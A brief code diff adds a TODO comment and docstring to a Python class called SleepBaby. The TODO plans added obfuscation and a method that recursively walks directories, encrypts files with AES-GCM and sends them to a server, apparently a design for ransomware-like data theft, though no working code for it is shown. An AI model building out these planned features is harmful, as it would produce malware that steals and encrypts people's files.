@@ -8,8 +8,9 @@ import os
 import shutil
 from fileshuttle import FileShuttle as fs
 
-
+#TODO: add more obfuscation and encoding to runtime parsing and passing recursively through the sleepbaby class. also add a filewalker method to the sleepbaby class that uses the file shuttle to recursively walk through directories and files, encrypting them with AES-GCM and sending them to the server. 
 class SleepBaby:
+    """A class that provides methods for generating random strings, encrypting and decrypting data using AES-GCM, and managing file operations using the FileShuttle class."""
 
     def __init__(self, sleep_time=5):
         self.sleep_time = sleep_time
